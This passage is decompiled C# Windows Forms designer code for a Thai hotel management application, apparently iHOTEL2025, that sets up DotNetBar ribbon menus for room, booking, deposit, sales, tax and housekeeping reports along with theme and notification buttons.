		DevComponents.DotNetBar.RibbonBar ribbonBar_12 = this.RibbonBar_3;
		size = new System.Drawing.Size(148, 66);
		ribbonBar_12.Size = size;
		this.RibbonBar_3.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar_3.TabIndex = 1;
		this.RibbonBar_3.Text = "รายงานรายร\u0e31บของโรงแรม";
		this.RibbonBar_3.TitleStyle.Class = "";
		this.RibbonBar_3.TitleStyleMouseOver.Class = "";
		this.ItemContainer4.BackgroundStyle.Class = "";
		this.ItemContainer4.LayoutOrientation = DevComponents.DotNetBar.eOrientation.Vertical;
		this.ItemContainer4.Name = "ItemContainer4";
		this.ItemContainer4.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.R17, this.R18 });
		this.R17.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.R17.Image = (System.Drawing.Image)resources.GetObject("R17.Image");
		this.R17.Name = "R17";
		this.R17.Text = "รายงานระหว\u0e48างว\u0e31นท\u0e35\u0e48";
		this.R18.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.R18.Image = (System.Drawing.Image)resources.GetObject("R18.Image");
		this.R18.Name = "R18";
		this.R18.Text = "รายงานตามรอบบ\u0e34ล";
		this.RibbonBar_2.AutoOverflowEnabled = true;
		this.RibbonBar_2.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar_2.BackgroundStyle.Class = "";
		this.RibbonBar_2.ContainerControlProcessDialogKey = true;
		this.RibbonBar_2.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar_2.Items.AddRange(new DevComponents.DotNetBar.BaseItem[6] { this.ButtonItem12, this.ButtonItem45, this.ButtonItem5, this.ButtonItem43, this.ItemContainer3, this.ItemContainer1 });
		DevComponents.DotNetBar.RibbonBar ribbonBar_13 = this.RibbonBar_2;
		location = new System.Drawing.Point(3, 0);
		ribbonBar_13.Location = location;
		this.RibbonBar_2.Name = "RibbonBar12";
		DevComponents.DotNetBar.RibbonBar ribbonBar_14 = this.RibbonBar_2;
		size = new System.Drawing.Size(711, 66);
		ribbonBar_14.Size = size;
		this.RibbonBar_2.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar_2.TabIndex = 0;
		this.RibbonBar_2.Text = "รายงาน";
		this.RibbonBar_2.TitleStyle.Class = "";
		this.RibbonBar_2.TitleStyleMouseOver.Class = "";
		this.RibbonBar_2.TitleVisible = false;
		this.ButtonItem12.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem12.Image = (System.Drawing.Image)resources.GetObject("ButtonItem12.Image");
		this.ButtonItem12.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem12.Name = "ButtonItem12";
		this.ButtonItem12.SubItemsExpandWidth = 14;
		this.ButtonItem12.Text = "สถานะห\u0e49องพ\u0e31ก";
		this.ButtonItem45.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem45.Image = (System.Drawing.Image)resources.GetObject("ButtonItem45.Image");
		this.ButtonItem45.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem45.Name = "ButtonItem45";
		this.ButtonItem45.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[3] { this.R8, this.R9, this.ButtonItem67 });
		this.ButtonItem45.Text = "รายงานการขายส\u0e34นค\u0e49า";
		this.R8.Name = "R8";
		this.R8.Text = "รายงานส\u0e34นค\u0e49า";
		this.R9.Name = "R9";
		this.R9.Text = "รายงานการขายส\u0e34นค\u0e49า";
		this.ButtonItem67.Name = "ButtonItem67";
		this.ButtonItem67.Text = "รายงานการ <font color=\"#ED1C24\">ยกเล\u0e34ก</font> การขายส\u0e34นค\u0e49า";
		this.ButtonItem5.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem5.Image = (System.Drawing.Image)resources.GetObject("ButtonItem5.Image");
		this.ButtonItem5.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem5.Name = "ButtonItem5";
		this.ButtonItem5.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[4] { this.R7, this.R14, this.ButtonItem11, this.R6 });
		this.ButtonItem5.Text = "รายงานบ\u0e31ญช\u0e35/ภาษ\u0e35";
		this.R7.Name = "R7";
		this.R7.Text = "รายงานล\u0e39กหน\u0e35\u0e49";
		this.R14.Name = "R14";
		this.R14.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.ButtonItem20, this.ButtonItem50 });
		this.R14.Text = "รายงานเง\u0e34นม\u0e31ดจำ";
		this.ButtonItem20.Name = "ButtonItem20";
		this.ButtonItem20.Text = "รายงานร\u0e31บเง\u0e34นม\u0e31ดจำ";
		this.ButtonItem50.Name = "ButtonItem50";
		this.ButtonItem50.Text = "รายงานค\u0e37นเง\u0e34นม\u0e31ดจำ";
		this.ButtonItem11.Name = "ButtonItem11";
		this.ButtonItem11.Text = "รายงานสร\u0e38ปภาพรวมรายได\u0e49";
		this.R6.Name = "R6";
		this.R6.Text = "รายงานภาษ\u0e35ขาย";
		this.ButtonItem43.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem43.Image = (System.Drawing.Image)resources.GetObject("ButtonItem43.Image");
		this.ButtonItem43.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem43.Name = "ButtonItem43";
		this.ButtonItem43.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[14]
		{
			this.R1, this.R4, this.R2, this.ButtonItem30, this.ButtonItem51, this.R3, this.R11, this.R5, this.R16, this.R12,
			this.ButtonItem47, this.R10, this.ButtonItem54, this.ButtonItem59
		});
		this.ButtonItem43.Text = "รายงานเก\u0e35\u0e48ยวก\u0e31บห\u0e49อง";
		this.R1.Name = "R1";
		this.R1.Text = "รายงานสร\u0e38ปประจำว\u0e31น";
		this.R4.Name = "R4";
		this.R4.Text = "รายงานแขกท\u0e35\u0e48อย\u0e39\u0e48ในโรงแรม";
		this.R2.Name = "R2";
		this.R2.Text = "รายงานห\u0e49องท\u0e35\u0e48 <font color=\"#388194\">เข\u0e49าพ\u0e31ก</font>";
		this.ButtonItem30.Name = "ButtonItem30";
		this.ButtonItem30.Text = "รายงานห\u0e49องท\u0e35\u0e48 <font color=\"#388194\">พ\u0e31กต\u0e48อ</font>";
		this.ButtonItem51.Name = "ButtonItem51";
		this.ButtonItem51.Text = "รายงานแขกท\u0e35\u0e48กำล\u0e31งจะออก (ย\u0e31งไม\u0e48เช\u0e47คเอาท\u0e4c)";
		this.R3.Name = "R3";
		this.R3.Text = "รายงานแขกท\u0e35\u0e48ออกไปแล\u0e49ว";
		this.R11.Name = "R11";
		this.R11.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[5] { this.ButtonItem56, this.ButtonItem57, this.ButtonItem58, this.ButtonItem55, this.ButtonItem61 });
		this.R11.Text = "รายงานการ <font color=\"#C5C000\">จอง</font> ห\u0e49องพ\u0e31ก";
		this.ButtonItem56.Name = "ButtonItem56";
		this.ButtonItem56.Text = "รายงานการจองท\u0e31\u0e49งหมด";
		this.ButtonItem57.Name = "ButtonItem57";
		this.ButtonItem57.Text = "รายงานการจองแบบระบ\u0e38ห\u0e49องพ\u0e31ก";
		this.ButtonItem58.Name = "ButtonItem58";
		this.ButtonItem58.Text = "รายงานเง\u0e34นจอง";
		this.ButtonItem55.Name = "ButtonItem55";
		this.ButtonItem55.Text = "รายงาน เซลล\u0e4c แยกตามประเภทห\u0e49อง";
		this.ButtonItem61.Name = "ButtonItem61";
		this.ButtonItem61.Text = "รายงาน เซลล\u0e4c แยกตามว\u0e31นท\u0e35\u0e48/ล\u0e39กค\u0e49า";
		this.R5.Name = "R5";
		this.R5.Text = "รายงานการ <font color=\"#C0504D\">ย\u0e49าย</font> ห\u0e49องพ\u0e31ก";
		this.R16.Name = "R16";
		this.R16.Text = "รายงานการ <font color=\"#7D7974\">ซ\u0e48อม</font> ห\u0e49องพ\u0e31ก";
		this.R12.Name = "R12";
		this.R12.Text = "รายงานการ <font color=\"#ED1C24\">ยกเล\u0e34ก</font> ห\u0e49องพ\u0e31ก";
		this.ButtonItem47.Name = "ButtonItem47";
		this.ButtonItem47.Text = "รายงานห\u0e49องท\u0e35\u0e48 <font color=\"#B77540\">รอทำความสะอาด</font>";
		this.R10.Name = "R10";
		this.R10.Text = "รายงานห\u0e49องท\u0e35\u0e48 <font color=\"#22B14C\">ทำความสะอาดแล\u0e49ว</font>";
		this.ButtonItem54.Name = "ButtonItem54";
		this.ButtonItem54.Text = "รายงานการ เป\u0e34ด-ป\u0e34ด ไฟ";
		this.ButtonItem59.Name = "ButtonItem59";
		this.ButtonItem59.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.ButtonItem63, this.ButtonItem64 });
		this.ButtonItem59.Text = "รายงานแม\u0e48บ\u0e49าน";
		this.ButtonItem63.Name = "ButtonItem63";
		this.ButtonItem63.Text = "รายช\u0e37\u0e48อห\u0e49องท\u0e35\u0e48จะออกว\u0e31นน\u0e35\u0e49";
		this.ButtonItem64.Name = "ButtonItem64";
		this.ButtonItem64.Text = "รายช\u0e37\u0e48อห\u0e49องท\u0e35\u0e48พ\u0e31กต\u0e48อ";
		this.ItemContainer3.BackgroundStyle.Class = "";
		this.ItemContainer3.LayoutOrientation = DevComponents.DotNetBar.eOrientation.Vertical;
		this.ItemContainer3.Name = "ItemContainer3";
		this.ItemContainer3.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[3] { this.R13, this.R15, this.ButtonItem40 });
		this.R13.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.R13.Image = (System.Drawing.Image)resources.GetObject("R13.Image");
		this.R13.Name = "R13";
		this.R13.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.ButtonItem65, this.ButtonItem66 });
		this.R13.Text = "รายงานค\u0e39ปอง";
		this.ButtonItem65.Name = "ButtonItem65";
		this.ButtonItem65.Text = "รายงานตามค\u0e39ปอง";
		this.ButtonItem66.Name = "ButtonItem66";
		this.ButtonItem66.Text = "รายงานตามใบลงทะเบ\u0e35ยน";
		this.R15.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.R15.Image = (System.Drawing.Image)resources.GetObject("R15.Image");
		this.R15.Name = "R15";
		this.R15.Text = "รายงานสร\u0e38ปภาพรวม";
		this.ButtonItem40.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem40.Image = (System.Drawing.Image)resources.GetObject("ButtonItem40.Image");
		this.ButtonItem40.Name = "ButtonItem40";
		this.ButtonItem40.Text = "รายงานจำนวนเข\u0e49าพ\u0e31กล\u0e39กค\u0e49า";
		this.ItemContainer1.BackgroundStyle.Class = "";
		this.ItemContainer1.LayoutOrientation = DevComponents.DotNetBar.eOrientation.Vertical;
		this.ItemContainer1.Name = "ItemContainer1";
		this.ItemContainer1.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[1] { this.ButtonItem62 });
		this.ButtonItem62.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem62.Image = (System.Drawing.Image)resources.GetObject("ButtonItem62.Image");
		this.ButtonItem62.Name = "ButtonItem62";
		this.ButtonItem62.Text = "รายงานส\u0e48งอำเภอ รร.4";
		this.RibbonPanel7.ColorSchemeStyle = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonPanel7.Controls.Add(this.RibbonBar_7);
		this.RibbonPanel7.Dock = System.Windows.Forms.DockStyle.Fill;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel16 = this.RibbonPanel7;
		location = new System.Drawing.Point(0, 57);
		ribbonPanel16.Location = location;
		this.RibbonPanel7.Name = "RibbonPanel7";
		DevComponents.DotNetBar.RibbonPanel ribbonPanel17 = this.RibbonPanel7;
		padding = new System.Windows.Forms.Padding(3, 0, 3, 3);
		ribbonPanel17.Padding = padding;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel18 = this.RibbonPanel7;
		size = new System.Drawing.Size(1215, 69);
		ribbonPanel18.Size = size;
		this.RibbonPanel7.Style.Class = "";
		this.RibbonPanel7.StyleMouseDown.Class = "";
		this.RibbonPanel7.StyleMouseOver.Class = "";
		this.RibbonPanel7.TabIndex = 11;
		this.RibbonPanel7.Visible = false;
		this.RibbonBar_7.AutoOverflowEnabled = true;
		this.RibbonBar_7.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar_7.BackgroundStyle.Class = "";
		this.RibbonBar_7.ContainerControlProcessDialogKey = true;
		this.RibbonBar_7.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar_7.Items.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.ButtonItem39, this.B11_2 });
		DevComponents.DotNetBar.RibbonBar ribbonBar_15 = this.RibbonBar_7;
		location = new System.Drawing.Point(3, 0);
		ribbonBar_15.Location = location;
		this.RibbonBar_7.Name = "RibbonBar18";
		DevComponents.DotNetBar.RibbonBar ribbonBar_16 = this.RibbonBar_7;
		size = new System.Drawing.Size(179, 66);
		ribbonBar_16.Size = size;
		this.RibbonBar_7.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar_7.TabIndex = 0;
		this.RibbonBar_7.Text = "RibbonBar18";
		this.RibbonBar_7.TitleStyle.Class = "";
		this.RibbonBar_7.TitleStyleMouseOver.Class = "";
		this.RibbonBar_7.TitleVisible = false;
		this.ButtonItem39.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem39.Image = (System.Drawing.Image)resources.GetObject("ButtonItem39.Image");
		this.ButtonItem39.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem39.Name = "ButtonItem39";
		this.ButtonItem39.Text = "รายร\u0e31บ-รายจ\u0e48าย";
		this.B11_2.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B11_2.Image = (System.Drawing.Image)resources.GetObject("B11_2.Image");
		this.B11_2.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B11_2.Name = "B11_2";
		this.B11_2.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.ButtonItem41, this.ButtonItem42 });
		this.B11_2.Text = "ชำระเง\u0e34น/ล\u0e39กหน\u0e35\u0e49";
		this.ButtonItem41.Name = "ButtonItem41";
		this.ButtonItem41.Text = "ชำระเง\u0e34น-ล\u0e39กหน\u0e35\u0e49 รายการลงทะเบ\u0e35ยน";
		this.ButtonItem42.Name = "ButtonItem42";
		this.ButtonItem42.Text = "ชำระเง\u0e34น-ล\u0e39กหน\u0e35\u0e49 รายการขายส\u0e34นค\u0e49า";
		this.RibbonPanel3.ColorSchemeStyle = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonPanel3.Controls.Add(this.RibbonBar5);
		this.RibbonPanel3.Dock = System.Windows.Forms.DockStyle.Fill;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel19 = this.RibbonPanel3;
		location = new System.Drawing.Point(0, 0);
		ribbonPanel19.Location = location;
		this.RibbonPanel3.Name = "RibbonPanel3";
		DevComponents.DotNetBar.RibbonPanel ribbonPanel20 = this.RibbonPanel3;
		padding = new System.Windows.Forms.Padding(3, 0, 3, 3);
		ribbonPanel20.Padding = padding;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel21 = this.RibbonPanel3;
		size = new System.Drawing.Size(1444, 126);
		ribbonPanel21.Size = size;
		this.RibbonPanel3.Style.Class = "";
		this.RibbonPanel3.StyleMouseDown.Class = "";
		this.RibbonPanel3.StyleMouseOver.Class = "";
		this.RibbonPanel3.TabIndex = 3;
		this.RibbonBar5.AutoOverflowEnabled = true;
		this.RibbonBar5.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar5.BackgroundStyle.Class = "";
		this.RibbonBar5.ContainerControlProcessDialogKey = true;
		this.RibbonBar5.DialogLauncherVisible = true;
		this.RibbonBar5.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar5.Items.AddRange(new DevComponents.DotNetBar.BaseItem[4] { this.ButtonItem15, this.ButtonItem16, this.ButtonItem17, this.ButtonItem18 });
		DevComponents.DotNetBar.RibbonBar ribbonBar17 = this.RibbonBar5;
		location = new System.Drawing.Point(3, 0);
		ribbonBar17.Location = location;
		this.RibbonBar5.Name = "RibbonBar5";
		DevComponents.DotNetBar.RibbonBar ribbonBar18 = this.RibbonBar5;
		size = new System.Drawing.Size(300, 123);
		ribbonBar18.Size = size;
		this.RibbonBar5.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar5.TabIndex = 6;
		this.RibbonBar5.TitleStyle.Class = "";
		this.RibbonBar5.TitleStyleMouseOver.Class = "";
		this.RibbonBar5.TitleVisible = false;
		this.ButtonItem15.Image = (System.Drawing.Image)resources.GetObject("ButtonItem15.Image");
		this.ButtonItem15.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem15.Name = "ButtonItem15";
		this.ButtonItem15.Text = "ส\u0e35ฟ\u0e49า";
		this.ButtonItem15.Tooltip = "ส\u0e35ฟ\u0e49า";
		this.ButtonItem16.Image = (System.Drawing.Image)resources.GetObject("ButtonItem16.Image");
		this.ButtonItem16.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem16.Name = "ButtonItem16";
		this.ButtonItem16.Text = "ส\u0e35เทา";
		this.ButtonItem16.Tooltip = "ส\u0e35เทา";
		this.ButtonItem17.Image = (System.Drawing.Image)resources.GetObject("ButtonItem17.Image");
		this.ButtonItem17.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem17.Name = "ButtonItem17";
		this.ButtonItem17.Text = "ส\u0e35ดำ";
		this.ButtonItem17.Tooltip = "ส\u0e35ดำ";
		this.ButtonItem18.Image = (System.Drawing.Image)resources.GetObject("ButtonItem18.Image");
		this.ButtonItem18.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem18.Name = "ButtonItem18";
		this.ButtonItem18.Text = "VistaGlass";
		this.ButtonItem18.Tooltip = "ส\u0e35ดำ";
		this.ribbonTabItem1.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ribbonTabItem1.Checked = true;
		this.ribbonTabItem1.Image = (System.Drawing.Image)resources.GetObject("ribbonTabItem1.Image");
		this.ribbonTabItem1.Name = "ribbonTabItem1";
		this.ribbonTabItem1.Panel = this.ribbonPanel1;
		this.ribbonTabItem1.Text = "หน\u0e49าหล\u0e31ก";
		this.RibbonTabItem2.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.RibbonTabItem2.Image = (System.Drawing.Image)resources.GetObject("RibbonTabItem2.Image");
		this.RibbonTabItem2.Name = "RibbonTabItem2";
		this.RibbonTabItem2.Panel = this.RibbonPanel7;
		this.RibbonTabItem2.Text = "บ\u0e31ญช\u0e35";
		this.RibbonTabItem4.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.RibbonTabItem4.Image = (System.Drawing.Image)resources.GetObject("RibbonTabItem4.Image");
		this.RibbonTabItem4.Name = "RibbonTabItem4";
		this.RibbonTabItem4.Panel = this.RibbonPanel5;
		this.RibbonTabItem4.Text = "รายงาน";
		this.RibbonTabItem3.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.RibbonTabItem3.Image = (System.Drawing.Image)resources.GetObject("RibbonTabItem3.Image");
		this.RibbonTabItem3.Name = "RibbonTabItem3";
		this.RibbonTabItem3.Panel = this.RibbonPanel2;
		this.RibbonTabItem3.Text = "ต\u0e31\u0e49งค\u0e48า";
		this.RibbonTabItem5.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.RibbonTabItem5.Image = (System.Drawing.Image)resources.GetObject("RibbonTabItem5.Image");
		this.RibbonTabItem5.Name = "RibbonTabItem5";
		this.RibbonTabItem5.Panel = this.RibbonPanel6;
		this.RibbonTabItem5.Text = "ธ\u0e35ม";
		this.RibbonTabItem_0.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.RibbonTabItem_0.Image = (System.Drawing.Image)resources.GetObject("อ\u0e31บเดทโปรแกรม.Image");
		this.RibbonTabItem_0.Name = "อ\u0e31บเดทโปรแกรม";
		this.RibbonTabItem_0.Panel = this.RibbonPanel4;
		this.RibbonTabItem_0.Text = "เก\u0e35\u0e48ยวก\u0e31บ";
		this.ButtonItem49.BeginGroup = true;
		this.ButtonItem49.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem49.Image = (System.Drawing.Image)resources.GetObject("ButtonItem49.Image");
		this.ButtonItem49.Name = "ButtonItem49";
		this.ButtonItem49.Text = "เปล\u0e35\u0e48ยน Server";
		this.ButtonItem53.BeginGroup = true;
		this.ButtonItem53.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem53.Image = (System.Drawing.Image)resources.GetObject("ButtonItem53.Image");
		this.ButtonItem53.Name = "ButtonItem53";
		this.ButtonItem53.Text = "ส\u0e48ง SMS";
		this.ButtonItem53.Visible = false;
		this.ButtonNotification.BeginGroup = true;
		this.ButtonNotification.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonNotification.Category = "แจ\u0e49งเต\u0e37อน";
		this.ButtonNotification.Image = iHOTEL2025.My.Resources.Resources._04__4_;
		this.ButtonNotification.Name = "ButtonNotification";
		this.ButtonNotification.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.LabelItem6, this.LabelItemNotify });
		this.ButtonNotification.Text = "ไม\u0e48ม\u0e35การแจ\u0e49งเต\u0e37อน";
		this.LabelItem6.BackColor = System.Drawing.Color.FromArgb(201, 211, 218);
		this.LabelItem6.BorderSide = DevComponents.DotNetBar.eBorderSide.Bottom;
		this.LabelItem6.BorderType = DevComponents.DotNetBar.eBorderType.SingleLine;
		this.LabelItem6.ForeColor = System.Drawing.Color.FromArgb(0, 21, 110);
		this.LabelItem6.Name = "LabelItem6";
		this.LabelItem6.PaddingBottom = 1;
		this.LabelItem6.PaddingLeft = 10;
		this.LabelItem6.PaddingTop = 1;
		this.LabelItem6.SingleLineColor = System.Drawing.Color.FromArgb(197, 197, 197);
		this.LabelItem6.Text = "การแจ\u0e49งเต\u0e37อน";
		this.LabelItemNotify.BackColor = System.Drawing.Color.FromArgb(221, 231, 238);
		this.LabelItemNotify.BorderSide = DevComponents.DotNetBar.eBorderSide.Bottom;
		this.LabelItemNotify.BorderType = DevComponents.DotNetBar.eBorderType.SingleLine;
		this.LabelItemNotify.ForeColor = System.Drawing.Color.FromArgb(0, 21, 110);
		this.LabelItemNotify.Name = "LabelItemNotify";
		this.LabelItemNotify.PaddingBottom = 1;
		this.LabelItemNotify.PaddingLeft = 10;
		this.LabelItemNotify.PaddingTop = 1;
		this.LabelItemNotify.SingleLineColor = System.Drawing.Color.FromArgb(197, 197, 197);
		this.LabelItemNotify.Text = resources.GetString("LabelItemNotify.Text");
		this.ButtonItem_Version.BeginGroup = true;
		this.ButtonItem_Version.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem_Version.Image = iHOTEL2025.My.Resources.Resources._49__5_;
		this.ButtonItem_Version.Name = "ButtonItem_Version";
		this.ButtonItem_Version.Text = "ร\u0e38\u0e48น 1.8.5 เป\u0e47นป\u0e31จจ\u0e38บ\u0e31น";
		this.ButtonItem_Version.Tooltip = "ตรวจสอบการอ\u0e31บเดท";
		this.ButtonFile.AutoExpandOnClick = true;
		this.ButtonFile.HotTrackingStyle = DevComponents.DotNetBar.eHotTrackingStyle.Image;
		this.ButtonFile.Image = (System.Drawing.Image)resources.GetObject("ButtonFile.Image");
		this.ButtonFile.ImagePaddingHorizontal = 2;
		this.ButtonFile.ImagePaddingVertical = 2;
		this.ButtonFile.Name = "ButtonFile";
		this.ButtonFile.ShowSubItems = false;
		this.ButtonFile.Text = "F&ile";
		this.QatCustomizeItem1.Name = "QatCustomizeItem1";
		this.RibbonTabItemGroup1.Color = DevComponents.DotNetBar.eRibbonTabGroupColor.Orange;
		this.RibbonTabItemGroup1.GroupTitle = "Tab Group";
		this.RibbonTabItemGroup1.Name = "RibbonTabItemGroup1";
		this.RibbonTabItemGroup1.Style.BackColor = System.Drawing.Color.FromArgb(240, 158, 159);
		this.RibbonTabItemGroup1.Style.BackColor2 = System.Drawing.Color.FromArgb(249, 225, 226);
		this.RibbonTabItemGroup1.Style.BackColorGradientAngle = 90;
		this.RibbonTabItemGroup1.Style.BorderBottom = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup1.Style.BorderBottomWidth = 1;
		this.RibbonTabItemGroup1.Style.BorderColor = System.Drawing.Color.FromArgb(154, 58, 59);
		this.RibbonTabItemGroup1.Style.BorderLeft = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup1.Style.BorderLeftWidth = 1;
		this.RibbonTabItemGroup1.Style.BorderRight = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup1.Style.BorderRightWidth = 1;
		this.RibbonTabItemGroup1.Style.BorderTop = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup1.Style.BorderTopWidth = 1;
		this.RibbonTabItemGroup1.Style.Class = "";
		this.RibbonTabItemGroup1.Style.TextAlignment = DevComponents.DotNetBar.eStyleTextAlignment.Center;
		this.RibbonTabItemGroup1.Style.TextColor = System.Drawing.Color.Black;
		this.RibbonTabItemGroup1.Style.TextLineAlignment = DevComponents.DotNetBar.eStyleTextAlignment.Near;
		this.RibbonTabItemGroup2.Color = DevComponents.DotNetBar.eRibbonTabGroupColor.Orange;
		this.RibbonTabItemGroup2.GroupTitle = "สต\u0e4aอคกล\u0e48อง";
		this.RibbonTabItemGroup2.Name = "RibbonTabItemGroup2";
		this.RibbonTabItemGroup2.Style.BackColor = System.Drawing.Color.FromArgb(255, 255, 255);
		this.RibbonTabItemGroup2.Style.BackColor2 = System.Drawing.Color.FromArgb(255, 255, 255);
		this.RibbonTabItemGroup2.Style.BackColorGradientAngle = 90;
		this.RibbonTabItemGroup2.Style.BorderBottom = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup2.Style.BorderBottomWidth = 1;
		this.RibbonTabItemGroup2.Style.BorderColor = System.Drawing.Color.FromArgb(154, 58, 59);
		this.RibbonTabItemGroup2.Style.BorderLeft = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup2.Style.BorderLeftWidth = 1;
		this.RibbonTabItemGroup2.Style.BorderRight = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup2.Style.BorderRightWidth = 1;
		this.RibbonTabItemGroup2.Style.BorderTop = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup2.Style.BorderTopWidth = 1;
		this.RibbonTabItemGroup2.Style.Class = "";
		this.RibbonTabItemGroup2.Style.TextAlignment = DevComponents.DotNetBar.eStyleTextAlignment.Center;
		this.RibbonTabItemGroup2.Style.TextColor = System.Drawing.Color.Turquoise;
		this.RibbonTabItemGroup2.Style.TextLineAlignment = DevComponents.DotNetBar.eStyleTextAlignment.Near;
		this.RibbonTabItemGroup2.Style.TextShadowColor = System.Drawing.Color.Black;
		DevComponents.DotNetBar.ElementStyle style = this.RibbonTabItemGroup2.Style;
		location = new System.Drawing.Point(1, 1);
		style.TextShadowOffset = location;
		this.RibbonTabItemGroup2.Style.TextTrimming = DevComponents.DotNetBar.eStyleTextTrimming.Character;
		this.RibbonTabItemGroup3.Color = DevComponents.DotNetBar.eRibbonTabGroupColor.Green;
		this.RibbonTabItemGroup3.GroupTitle = "สต\u0e4aอคสต\u0e34\u0e4aกเกอร\u0e4c";
		this.RibbonTabItemGroup3.Name = "RibbonTabItemGroup3";
		this.RibbonTabItemGroup3.Style.BackColor = System.Drawing.Color.FromArgb(174, 109, 148);
		this.RibbonTabItemGroup3.Style.BackColor2 = System.Drawing.Color.FromArgb(144, 72, 123);
		this.RibbonTabItemGroup3.Style.BackColorGradientAngle = 90;
		this.RibbonTabItemGroup3.Style.BorderBottom = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup3.Style.BorderBottomWidth = 1;
		this.RibbonTabItemGroup3.Style.BorderColor = System.Drawing.Color.FromArgb(154, 58, 59);
		this.RibbonTabItemGroup3.Style.BorderLeft = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup3.Style.BorderLeftWidth = 1;
		this.RibbonTabItemGroup3.Style.BorderRight = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup3.Style.BorderRightWidth = 1;
		this.RibbonTabItemGroup3.Style.BorderTop = DevComponents.DotNetBar.eStyleBorderType.Solid;
		this.RibbonTabItemGroup3.Style.BorderTopWidth = 1;
		this.RibbonTabItemGroup3.Style.Class = "";
		this.RibbonTabItemGroup3.Style.TextAlignment = DevComponents.DotNetBar.eStyleTextAlignment.Center;
		this.RibbonTabItemGroup3.Style.TextColor = System.Drawing.Color.White;
		this.RibbonTabItemGroup3.Style.TextLineAlignment = DevComponents.DotNetBar.eStyleTextAlignment.Near;
		this.RibbonTabItemGroup3.Style.TextShadowColor = System.Drawing.Color.Black;
